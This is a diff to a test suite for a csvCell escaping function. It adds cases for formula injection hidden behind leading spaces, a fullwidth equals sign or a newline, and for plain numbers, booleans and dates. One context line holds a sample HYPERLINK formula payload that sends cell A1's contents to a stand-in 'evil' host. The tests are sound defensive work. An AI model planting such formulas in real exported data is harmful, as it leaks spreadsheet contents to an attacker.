@@ -22,5 +22,15 @@ describe("csvCell", () => {
       '"\'=HYPERLINK(""https://evil/?""&A1,""click"")"',
     );
     expect(csvCell("a=b")).toBe("a=b");
+    expect(csvCell("  =1+1")).toBe("'  =1+1");
+    expect(csvCell("\uff1d1+1")).toBe("'\uff1d1+1");
+    expect(csvCell("\n=1")).toBe('"\'\n=1"');
+  });
+
+  it("leaves numbers, booleans and dates as values", () => {
+    expect(csvCell(-0.5)).toBe("-0.5");
+    expect(csvCell(true)).toBe("true");
+    expect(csvCell(new Date("2026-11-01T00:00:00Z"))).toBe("2026-11-01T00:00:00.000Z");
+    expect(csvCell([{ item_id: "x" }])).toBe('"[{""item_id"":""x""}]"');
   });
 });
